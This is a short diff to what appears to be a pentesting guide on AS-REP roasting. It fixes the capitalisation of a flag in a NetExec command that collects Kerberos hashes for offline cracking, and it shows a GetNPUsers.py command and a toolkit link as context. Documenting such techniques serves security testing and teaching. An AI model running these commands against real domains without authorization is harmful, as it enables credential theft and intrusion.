@@ -42,7 +42,7 @@ GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes '
 This can also be achieved with [NetExec](https://github.com/Pennyw0rth/NetExec) (Python).
 
 ```bash
-netexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt --KdcHost $KeyDistributionCenter
+netexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt --kdcHost $KeyDistributionCenter
 ```
 
 The [kerberoast](https://github.com/skelsec/kerberoast) pure-python toolkit is a good alternative to the tools mentioned above.
